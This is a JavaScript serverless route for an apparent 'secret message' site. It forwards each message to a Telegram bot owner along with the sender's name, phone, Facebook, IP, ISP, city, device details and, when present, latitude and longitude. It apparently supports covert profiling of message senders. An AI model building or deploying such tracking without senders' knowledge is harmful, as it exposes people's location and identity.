JavaScript
// api/send.js
// ✅ Secure Telegram Backend Route
// ✅ Vercel Compatible
// ✅ Rate Limited
// ✅ Sanitized
// ✅ Safe JSON Response

const RATE_MAP = new Map();

function rateLimit(ip) {
  const now = Date.now();

  const entry = RATE_MAP.get(ip) || {
    count: 0,
    reset: now + 60000
  };

  if (now > entry.reset) {
    entry.count = 0;
    entry.reset = now + 60000;
  }

  entry.count++;

  RATE_MAP.set(ip, entry);

  return entry.count > 5;
}

function sanitize(str, max = 2000) {
  if (!str) return '';

  return String(str)
    .replace(/[<>]/g, '')
    .replace(/\s+/g, ' ')
    .trim()
    .slice(0, max);
}

export default async function handler(req, res) {

  // ─────────────────────────────────────
  // CORS
  // ─────────────────────────────────────
  res.setHeader(
    'Access-Control-Allow-Origin',
    process.env.SITE_URL || '*'
  );

  res.setHeader(
    'Access-Control-Allow-Methods',
    'POST, OPTIONS'
  );

  res.setHeader(
    'Access-Control-Allow-Headers',
    'Content-Type'
  );

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({
      ok: false,
      error: 'Method not allowed'
    });
  }

  // ─────────────────────────────────────
  // RATE LIMIT
  // ─────────────────────────────────────
  const ip =
    req.headers['x-forwarded-for']?.split(',')[0] ||
    req.socket?.remoteAddress ||
    'unknown';

  if (rateLimit(ip)) {
    return res.status(429).json({
      ok: false,
      error: 'Too many requests. Please wait.'
    });
  }

  try {

    // ─────────────────────────────────────
    // BODY
    // ─────────────────────────────────────
    const {
      uid,
      name,
      phone,
      fb,
      message,
      device
    } = req.body || {};

    if (!message || !message.trim()) {
      return res.status(400).json({
        ok: false,
        error: 'Message required'
      });
    }

    if (message.trim().length < 2) {
      return res.status(400).json({
        ok: false,
        error: 'Message too short'
      });
    }

    // ─────────────────────────────────────
    // ENV
    // ─────────────────────────────────────
    const BOT_TOKEN = process.env.BOT_TOKEN;
    const OWNER_ID = process.env.OWNER_ID;

    if (!BOT_TOKEN || !OWNER_ID) {
      return res.status(500).json({
        ok: false,
        error: 'Server misconfigured'
      });
    }

    // ─────────────────────────────────────
    // SANITIZE
    // ─────────────────────────────────────
    const sUid = sanitize(uid, 50) || '???';

    const sName =
      sanitize(name, 120) || '—';

    const sPhone =
      sanitize(phone, 120) || '—';

    const sFb =
      sanitize(fb, 200) || '—';

    const sMsg =
      sanitize(message, 3000);

    const dev = device || {};

    const shortUA =
      sanitize(dev.ua || '—', 120);

    // ─────────────────────────────────────
    // TIME
    // ─────────────────────────────────────
    const now = new Date().toLocaleString(
      'en-US',
      {
        dateStyle: 'full',
        timeStyle: 'medium',
        timeZone: 'Asia/Dhaka'
      }
    );

    // ─────────────────────────────────────
    // TELEGRAM TEXT
    // ─────────────────────────────────────
    const text =
`💌 NEW SECRET MESSAGE

🆔 USER ID: #${sUid}
⏰ TIME: ${now}

━━━━━━━━━━━━━━━━━━
👤 SENDER INFO
━━━━━━━━━━━━━━━━━━

👤 NAME: ${sName}
📱 PHONE: ${sPhone}
🔵 FACEBOOK: ${sFb}

━━━━━━━━━━━━━━━━━━
📱 DEVICE INFO
━━━━━━━━━━━━━━━━━━

📱 MODEL: ${dev.model || '—'}
💻 OS: ${dev.os || '—'}
🧠 RAM: ${dev.ram || '—'}
⚙️ CPU: ${dev.cpu || '—'}
📺 SCREEN: ${dev.screen || '—'}

🔋 BATTERY: ${dev.battery || '—'}
⚡ STATUS: ${dev.charging || '—'}

🗣 LANGUAGE: ${dev.lang || '—'}
🕐 TIMEZONE: ${dev.tz || '—'}

━━━━━━━━━━━━━━━━━━
🌐 NETWORK INFO
━━━━━━━━━━━━━━━━━━

🌐 IP: ${dev.ip || '—'}
🌍 COUNTRY: ${dev.country || '—'}
📍 DIVISION: ${dev.division || '—'}
🏙 CITY: ${dev.city || '—'}
📶 ISP: ${dev.isp || '—'}

${dev.lat ? `🗺 LOCATION: ${dev.lat}, ${dev.lon}` : ''}

━━━━━━━━━━━━━━━━━━
🕵️ USER AGENT
━━━━━━━━━━━━━━━━━━

${shortUA}

━━━━━━━━━━━━━━━━━━
💌 MESSAGE
━━━━━━━━━━━━━━━━━━

${sMsg}

━━━━━━━━━━━━━━━━━━
💬 REPLY COMMAND:

/send ${sUid} your_reply_here
`;

    // ─────────────────────────────────────
    // INLINE BUTTONS
    // ─────────────────────────────────────
    const keyboard = {
      inline_keyboard: [
        [
          {
            text: `💌 Reply #${sUid}`,
            callback_data: `reply_${sUid}`
          },
          {
            text: `📊 Info #${sUid}`,
            callback_data: `info_${sUid}`
          }
        ]
      ]
    };

    // ─────────────────────────────────────
    // SEND TO TELEGRAM
    // ─────────────────────────────────────
    const tgRes = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        method: 'POST',

        headers: {
          'Content-Type': 'application/json'
        },

        body: JSON.stringify({
          chat_id: OWNER_ID,
          text,
          reply_markup: keyboard
        })
      }
    );

    const tgData = await tgRes.json();

    if (!tgData.ok) {
      throw new Error(
        tgData.description || 'Telegram API Error'
      );
    }

    // ─────────────────────────────────────
    // SUCCESS
    // ─────────────────────────────────────
    return res.status(200).json({
      ok: true,
      messageId: tgData.result?.message_id || null
    });

  } catch (err) {

    console.error(err);

    return res.status(500).json({
      ok: false,
      error:
        'Failed to send: ' +
        (err.message || 'Unknown error')
    });
  }
}
